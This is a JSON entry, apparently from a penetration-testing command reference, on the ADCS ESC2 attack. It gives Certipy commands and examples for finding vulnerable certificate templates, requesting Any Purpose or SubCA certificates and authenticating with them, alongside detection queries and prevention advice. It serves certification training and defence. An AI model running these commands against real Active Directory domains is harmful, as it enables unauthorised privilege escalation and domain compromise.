@@ -1,0 +1,100 @@
+{
+  "id": "ad-adcs-esc2-any-purpose",
+  "name": "ADCS ESC2 - Any Purpose / Subordinate CA Certificate",
+  "command": "certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -dc-ip <dc_ip>",
+  "description": "ESC2 exploits certificate templates with the \"Any Purpose\" EKU (OID 2.5.29.37.0) or no EKU (SubCA template). Any Purpose certificates can be used for client authentication, server authentication, code signing - everything. SubCA certificates can sign other certificates. Both grant far more power than intended if enrollment is not restricted.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ADCS Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "SpecterOps Certified Pre-Owned; CRTP ADCS module",
+  "tags": [
+    "adcs",
+    "esc2",
+    "any-purpose",
+    "subordinate-ca",
+    "certificate-template",
+    "eku"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CONDITIONS ===\n1. Template has \"Any Purpose\" EKU (2.5.29.37.0) or no EKU at all\n2. Low-privileged users can enroll\n3. Manager approval is not required\n\n=== \"ANY PURPOSE\" EKU ===\n  # Request certificate with Any Purpose EKU:\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template>\n  # Use for authentication:\n  certipy auth -pfx <user>.pfx -dc-ip <dc_ip>\n  # The certificate can also be used for code signing, server auth, etc.\n\n=== SUBORDINATE CA (SubCA) ===\n  # If template issues SubCA certificates:\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template SubCA\n  # This cert can SIGN OTHER CERTIFICATES\n  # Similar to ForgeCert but without stealing the CA key\n\n=== FIND VULNERABLE TEMPLATES ===\n  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -vulnerable -stdout\n  # Look for ESC2 in output\n\n=== DIFFERENCE FROM ESC1 ===\n  ESC1: Template allows SAN (you specify who to impersonate)\n  ESC2: Template has overly permissive EKU (Any Purpose / SubCA)\n  Both lead to domain compromise, different mechanisms.",
+  "examples": [
+    {
+      "label": "Find ESC2 vulnerable templates",
+      "command": "certipy find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -vulnerable -stdout"
+    },
+    {
+      "label": "Request Any Purpose certificate",
+      "command": "certipy req -u jdoe@corp.local -p Password123 -ca corp-CA -template AnyPurposeTemplate"
+    },
+    {
+      "label": "Authenticate with the certificate",
+      "command": "certipy auth -pfx jdoe.pfx -dc-ip 192.168.1.10"
+    }
+  ],
+  "references": [
+    {
+      "title": "SpecterOps - Certified Pre-Owned",
+      "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+    },
+    {
+      "title": "Certipy ESC2",
+      "url": "https://github.com/ly4k/Certipy#esc2"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-esc1-certipy-linux",
+      "note": "ESC1 uses SAN; ESC2 uses Any Purpose EKU. Different attack vectors.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-forgecert",
+      "note": "SubCA ESC2 certificates can sign other certs, similar to ForgeCert.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The \"Any Purpose\" EKU allows the certificate to be used for any purpose, including client authentication. SubCA templates issue certificates with signing capabilities. If enrollment is not restricted, any domain user can obtain these powerful certificates.",
+    "prerequisites": "Enrollment rights on a template with Any Purpose EKU or SubCA; CA approval not required.",
+    "impact": "Domain authentication as the requesting user; SubCA certs can potentially sign other certificates.",
+    "detection": "[MITRE T1649] Certificate enrollment for templates with unusual EKUs; Event 4886/4887 for the enrollment.",
+    "artifacts": "Event 4886 (certificate request); Event 4887 (certificate issued); certificate with Any Purpose or SubCA EKU.",
+    "splunk_spl": "index=windows EventCode=4887\n| where CertificateTemplate=\"*SubCA*\" OR CertificateTemplate=\"*AnyPurpose*\"\n| table _time, SubjectUserName, CertificateTemplate",
+    "elastic_kql": "event.code:\"4887\" AND winlog.event_data.CertificateTemplate:(*SubCA* OR *AnyPurpose*)",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4887\n| where CertificateTemplate has \"SubCA\" or CertificateTemplate has \"AnyPurpose\"\n| project TimeGenerated, SubjectUserName, CertificateTemplate",
+    "sigma_rules": "win_security_adcs_esc2_any_purpose_enrollment",
+    "prevention": "Remove \"Any Purpose\" EKU from templates; restrict SubCA template enrollment to admins; enable manager approval; audit certificate template configurations.",
+    "sources": [
+      "SpecterOps research",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "ESC2 - Enrollment in Any Purpose or SubCA template",
+        "logic": "SecurityEvent\n| where EventID == 4887\n| where CertificateTemplate has_any (\"SubCA\", \"AnyPurpose\", \"Any Purpose\")\n| where SubjectUserName !in (\"SYSTEM\", \"Administrator\")\n| project TimeGenerated, SubjectUserName, CertificateTemplate, Requester",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4887"
+        ],
+        "attack": [
+          "T1649"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate SubCA issuance by PKI administrators",
+        "tuning": "Alert on any non-admin enrollment in SubCA or Any Purpose templates"
+      }
+    ]
+  }
+}
